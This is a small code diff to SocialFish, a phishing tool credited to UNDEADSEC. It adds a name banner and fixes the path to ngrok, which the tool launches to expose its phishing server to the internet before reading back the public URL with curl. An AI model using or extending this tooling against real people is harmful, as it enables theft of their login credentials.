@@ -1,4 +1,8 @@
 #-*- coding: utf-8 -*-
+#       SOCIALFISH
+#     by: UNDEADSEC
+#
+###########################
 from time import sleep
 from sys import stdout, exit
 from os import system, path
@@ -164,7 +168,7 @@ def runPEnv():
         exit(0)
 
 def runNgrok():
-    system('./Server/www/ngrok http 80 > /dev/null &')
+    system('./Server/ngrok http 80 > /dev/null &')
     sleep(10)
     system('curl -s http://127.0.0.1:4040/status | grep -P "https://.*?ngrok.io" -oh > ngrok.url')
     url = open('ngrok.url', 'r')
